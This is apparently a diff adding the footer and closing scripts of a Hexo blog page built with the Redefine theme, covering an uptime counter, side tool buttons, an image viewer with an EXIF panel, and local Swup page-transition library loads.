+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+		<li class="right-bottom-tools rss flex justify-center items-center">
+			<a class="flex justify-center items-center" href="/atom.xml" target="_blank">
+				<i class="fa-regular fa-rss"></i>
+			</a>
+		</li>
+		
+
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="fa-regular fa-arrow-up"></i>
+		</li>
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="Image viewer">
+	<button class="image-viewer-close" type="button" aria-label="Close">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="Prev">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="Close">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="Next">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
